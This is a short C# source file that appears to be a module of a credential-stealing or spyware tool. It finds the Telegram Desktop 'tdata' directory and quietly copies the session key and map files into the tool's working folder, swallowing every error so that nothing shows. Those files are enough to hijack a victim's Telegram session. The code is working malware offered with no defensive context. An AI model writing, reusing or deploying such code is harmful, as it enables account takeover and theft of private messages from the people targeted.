using System;
using System.IO;

namespace _s_AINT
{
    class cTelegram
    {
        public static void Telegram()
        {
            try
            {
                string text = Program.workdir + "\\Telegram";
                string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
				if (Directory.Exists(text2))
				{
					if (!Directory.Exists(text + "\\D877F783D5D3EF8C"))
					{
						Directory.CreateDirectory(text + "\\D877F783D5D3EF8C");
					}
					string[] array = new string[4]
					{
					"\\D877F783D5D3EF8C1",
					"\\D877F783D5D3EF8C0",
					"\\D877F783D5D3EF8C\\map1",
					"\\D877F783D5D3EF8C\\map0"
					};
					foreach (string str in array)
					{
						try
						{
							File.Copy(text2 + str, text + str, overwrite: true);
						}
						catch
						{
						}
					}
                }
                return;
            }	
            catch { }
        }
    }
}
